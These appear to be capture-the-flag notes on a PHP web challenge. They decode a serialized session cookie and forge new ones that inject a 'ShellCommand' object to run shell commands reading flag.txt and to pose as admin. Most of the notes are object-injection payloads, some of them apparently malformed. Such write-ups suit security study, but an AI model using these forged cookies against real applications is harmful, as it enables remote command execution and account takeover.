## strategy
* cookie looks like this: 
```
session=O%3A4%3A%22User%22%3A4%3A%7Bs%3A3%3A%22uid%22%3Bi%3A1234%3Bs%3A4%3A%22name%22%3Bs%3A5%3A%22guest%22%3Bs%3A2%3A%22db%22%3BO%3A2%3A%22DB%22%3A1%3A%7Bs%3A9%3A%22db_driver%22%3BO%3A8%3A%22DBDriver%22%3A0%3A%7B%7D%7Ds%3A6%3A%22active%22%3Bb%3A1%3B%7D
```
* there are words in there like "User", "uid", "name", "guest", "db",  "DB", "db_driver", "Driver" and "active"
* seems like it is a serialized user object
* function __wakeup is essential for unserialization process: 
```
__sleep and __wakeup are methods that are related to the serialization process. 
serialize function checks if a class has a __sleep method. If so, it will be executed before any serialization. 
__sleep is supposed to return an array of the names of all variables of an object that should be serialized.

__wakeup in turn will be executed by unserialize if it is present in class. 
It's intention is to re-establish resources and other things that are needed to be initialized upon unserialization.
```


## strategy 
* build a cookie with. 
    ** DB object is a ShellCommand
    ** uid contains a command injection; it terminates the sql command and then executes 'cat flag.txt'

cookie: 
 1. Decode URL 
 
 cookie =     session=O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";s:5:"guest";s:2:"db";O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}s:6:"active";b:1;}
 
 new_cookie = session=O:4:"User":4:{s:3:"uid";i:1337;s:4:"name";s:5:"admin";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:63:"echo $(cd ..; cd ..; cd ..; cd opt; cat flag.txt); echo "woop";":0:{}}s:6:"active";b:1;}
 old_cookie = session=O:4:"User":4:{s:3:"uid";i:5555;s:4:"name";s:5:"mello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:63:"echo $(cd ..; cd ..; cd ..; cd opt; cat flag.txt); echo "woop";";}s:6:"active";b:1;}